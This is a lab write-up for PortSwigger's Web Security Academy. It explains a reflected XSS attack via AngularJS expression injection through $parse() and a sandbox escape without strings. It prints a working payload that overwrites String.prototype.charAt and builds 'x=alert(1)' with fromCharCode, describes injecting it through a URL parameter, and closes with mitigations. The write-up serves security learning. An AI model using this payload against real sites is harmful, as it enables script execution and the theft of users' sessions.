# Reflected XSS with AngularJS Sandbox Escape without Strings

## 📌 Lab Overview

This lab demonstrates how AngularJS expressions can be abused to achieve **Reflected Cross-Site Scripting (XSS)** by escaping the AngularJS sandbox.

The vulnerability occurred because:
- user-controlled input was processed dynamically by AngularJS
- AngularJS expressions were evaluated using `$parse()`
- the AngularJS sandbox restrictions could be bypassed
- arbitrary JavaScript execution became possible

This lab focused on:
- AngularJS expression injection
- AngularJS sandbox escape
- JavaScript constructor abuse
- prototype manipulation
- bypassing restrictions without using direct strings

---

# 🔍 What is AngularJS?

AngularJS is a JavaScript framework used to:
- build dynamic webpages
- process user input
- automatically update HTML
- evaluate expressions inside templates

Example:

```html
{{1+1}}
```

AngularJS evaluates this expression and prints:

```text
2
```

---

# 🔍 What is an AngularJS Sandbox?

AngularJS introduced a security mechanism called:

```text
Sandbox
```

Purpose:
- prevent dangerous JavaScript execution
- restrict access to sensitive browser functions
- stop attackers from running arbitrary code

The sandbox attempted to block access to:
- `window`
- `document`
- `alert`
- dangerous constructors
- sensitive JavaScript functions

---

# ⚠ Why the Sandbox Was Vulnerable

Older AngularJS versions had bypass techniques.

Attackers discovered methods to:
- manipulate JavaScript internals
- abuse constructors
- modify prototypes
- escape the sandbox restrictions

This technique is called:

```text
AngularJS Sandbox Escape
```

---

# 🎯 Objective

The goal of this lab was to:
- identify AngularJS processing
- understand how user input was evaluated
- inject malicious AngularJS expressions
- bypass the AngularJS sandbox
- execute arbitrary JavaScript successfully

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/xss/Reflected%20XSS%20with%20AngularJS%20Sandbox%20Escape%20without%20Strings/screenshots/lab14(1).png?raw=true)

The application initially displayed:
- a normal webpage
- a search functionality

The word:

```text
hello
```

was entered into the search field.

---

## Screenshot 2 — Discovering AngularJS Code

![Screenshot 2](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/xss/Reflected%20XSS%20with%20AngularJS%20Sandbox%20Escape%20without%20Strings/screenshots/lab14(2).png?raw=true)

While inspecting the page, the following AngularJS code was discovered:

```javascript
angular.module('labApp', []).controller('vulnCtrl', function($scope, $parse) {

    $scope.query = {};

    var key = 'search';

    $scope.query[key] = 'hello';

    $scope.value = $parse(key)($scope.query);

});
```

---

# 🔍 Full Code Breakdown

---

# `angular.module('labApp', [])`

Creates a new AngularJS application module.

---

# `.controller('vulnCtrl', function(...))`

Defines a controller named:

```text
vulnCtrl
```

Controllers manage application behavior and data.

---

# `$scope.query = {};`

Creates an empty JavaScript object.

Equivalent to:

```javascript
{}
```

This acts like a dictionary for storing parameters.

---

# `var key = 'search';`

Stores:

```javascript
search
```

inside the variable `key`.

---

# `$scope.query[key] = 'hello';`

Equivalent to:

```javascript
$scope.query['search'] = 'hello';
```

Result:

```javascript
{
   search: "hello"
}
```

The user input is inserted dynamically into the object.

---

# `$parse(key)($scope.query);`

This is the important part.

---

# 🔍 What is `$parse()`?

`$parse()` is an AngularJS function that:
- dynamically evaluates expressions
- interprets AngularJS code

Example:

```javascript
$parse("search")(obj)
```

This retrieves:

```javascript
obj.search
```

---

# ⚠ Why This is Dangerous

If attackers control:
- expressions
- parameter names
- AngularJS parsing behavior

then malicious AngularJS expressions may execute.

---

## Screenshot 3 — Testing Additional Parameters

![Screenshot 3](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/xss/Reflected%20XSS%20with%20AngularJS%20Sandbox%20Escape%20without%20Strings/screenshots/lab14(3).png?raw=true)

A second parameter was appended to the URL:

```text
https://example.net/?search=hello&abcd=1
```

After inspecting the page:

```javascript
angular.module('labApp', []).controller('vulnCtrl', function($scope, $parse) {

    $scope.query = {};

    var key = 'search';
    $scope.query[key] = 'hello';
    $scope.value = $parse(key)($scope.query);

    var key = 'abcd';
    $scope.query[key] = '1';
    $scope.value = $parse(key)($scope.query);

});
```

---

# 🔍 Important Observation

Every URL parameter:
- was being processed dynamically
- passed through `$parse()`

This meant:
- attacker-controlled expressions could potentially execute

---

# ⚠ Vulnerability Root Cause

The application trusted:
- user-controlled parameter names
- AngularJS parsing behavior

This created an AngularJS expression injection vulnerability.

---

## Screenshot 4 — Sandbox Escape Payload

![Screenshot 4](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/xss/Reflected%20XSS%20with%20AngularJS%20Sandbox%20Escape%20without%20Strings/screenshots/lab14(4).png?raw=true)

A sandbox escape payload from the PortSwigger XSS Cheat Sheet was used:

```javascript
toString().constructor.prototype.charAt=[].join;
[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

---

# 🔍 Full Payload Breakdown

---

# Part 1 — Prototype Manipulation

```javascript
toString().constructor.prototype.charAt=[].join;
```

---

# 🔍 Understanding `toString().constructor`

```javascript
toString().constructor
```

returns the JavaScript:

```javascript
String
```

constructor.

---

# 🔍 What is `.prototype`?

Every JavaScript object has:
- shared functions
- inherited behavior

stored inside:

```javascript
prototype
```

---

# 🔍 What is Happening Here?

This code modifies:

```javascript
charAt()
```

function behavior.

---

# Original Behavior

Normally:

```javascript
"abc".charAt(1)
```

returns:

```text
b
```

---

# Modified Behavior

This line replaces:

```javascript
charAt
```

with:

```javascript
[].join
```

Purpose:
- break AngularJS sandbox assumptions
- confuse AngularJS internal security checks

This is part of the sandbox escape technique.

---

# Part 2 — Using AngularJS Filter

```javascript
[1,2]|orderBy:
```

AngularJS supports filters like:

```javascript
orderBy
```

The payload abuses this filter to evaluate expressions.

---

# Part 3 — Generating JavaScript without Strings

```javascript
toString().constructor.fromCharCode(...)
```

---

# 🔍 What is `fromCharCode()`?

Converts ASCII numbers into characters.

Example:

```javascript
String.fromCharCode(97)
```

returns:

```text
a
```

---

# ASCII Conversion Breakdown

```javascript
120 = x
61  = =
97  = a
108 = l
101 = e
114 = r
116 = t
40  = (
49  = 1
41  = )
```

Combined result:

```javascript
x=alert(1)
```

---

# ⚠ Why This is Important

The lab required:
- bypassing restrictions without direct strings

Instead of writing:

```javascript
alert(1)
```

directly,
the payload generated it dynamically using ASCII values.

This bypassed sandbox restrictions.

---

## Screenshot 5 — URL Encoding the Payload

![Screenshot 5](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/xss/Reflected%20XSS%20with%20AngularJS%20Sandbox%20Escape%20without%20Strings/screenshots/lab14(5).png?raw=true)

The payload was encoded using Burp Suite Decoder.

Purpose:
- safely inject special characters into the URL

---

## Screenshot 6 — Injecting the Payload

![Screenshot 6](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/xss/Reflected%20XSS%20with%20AngularJS%20Sandbox%20Escape%20without%20Strings/screenshots/lab14(6).png?raw=true)

The encoded payload replaced the vulnerable parameter:

```text
abcd=
```

The final URL contained:
- the AngularJS sandbox escape payload
- dynamically generated JavaScript execution

---

## Screenshot 7 — Successful Exploitation

![Screenshot 7](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/xss/Reflected%20XSS%20with%20AngularJS%20Sandbox%20Escape%20without%20Strings/screenshots/lab14(7).png?raw=true)

After loading the malicious URL:
- the AngularJS sandbox was bypassed
- arbitrary JavaScript executed successfully

The application displayed:

```text
Congratulations, you have solved the lab!
```

The lab was successfully solved.

---

# ⚠ Why This Vulnerability Happens

The vulnerability occurred because:
- AngularJS evaluated user-controlled expressions
- `$parse()` processed attacker input dynamically
- AngularJS sandbox protections were insufficient
- JavaScript prototypes could be manipulated

---

# 💥 Impact of AngularJS Sandbox Escape

An attacker can potentially:
- execute arbitrary JavaScript
- steal cookies
- hijack accounts
- bypass client-side protections
- manipulate webpage behavior
- fully compromise users

---

# 🛡 Mitigation

To prevent AngularJS sandbox escapes:
- never evaluate user-controlled AngularJS expressions
- avoid `$parse()` on untrusted input
- upgrade AngularJS versions
- implement strict Content Security Policy (CSP)
- sanitize all user-controlled data
- avoid dangerous client-side expression parsing

---

# 🧠 Skills Learned

- Understanding AngularJS internals
- AngularJS sandbox concepts
- Sandbox escape techniques
- Prototype manipulation
- JavaScript constructors
- ASCII payload generation
- AngularJS expression injection
- Advanced XSS exploitation

---

# 🧰 Tools Used

- Burp Suite
- Burp Decoder
- Firefox Developer Tools
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how AngularJS sandbox protections can be bypassed through prototype manipulation and constructor abuse.

By analyzing AngularJS expression handling and abusing `$parse()`, it was possible to:
- inject malicious AngularJS expressions
- bypass sandbox restrictions
- dynamically generate JavaScript code
- execute arbitrary JavaScript successfully

Through this lab, I learned:
- how AngularJS evaluates expressions
- how `$parse()` works internally
- how sandbox escapes occur
- how JavaScript constructors can be abused
- how prototype manipulation bypasses client-side security mechanisms

The lab was successfully exploited by escaping the AngularJS sandbox and dynamically generating executable JavaScript without directly using strings.
